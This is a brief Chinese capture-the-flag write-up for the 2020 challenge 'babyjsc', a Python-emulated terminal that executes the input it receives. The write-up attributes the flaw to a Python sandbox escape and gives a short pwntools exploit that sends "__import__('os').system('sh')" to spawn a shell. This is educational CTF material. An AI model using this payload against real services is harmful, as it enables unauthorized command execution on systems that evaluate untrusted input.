# babyjsc

## 来源
2020 - 国赛


## 难度

1 / 10

## 简单描述

使用Python模拟的终端, 先输入大小, 然后jsc数据执行jsc数据.

## vul

使用python 模拟的终端



## 知识点

python sanbox escape

## 思路

python 沙箱逃逸



## EXP

```
from pwn import *
sh = remote('0.0.0.0', 0)
p = "__import__('os').system('sh')"
sh.sendline(len(p))
sh.sendline(p)
sh.interactive()
```







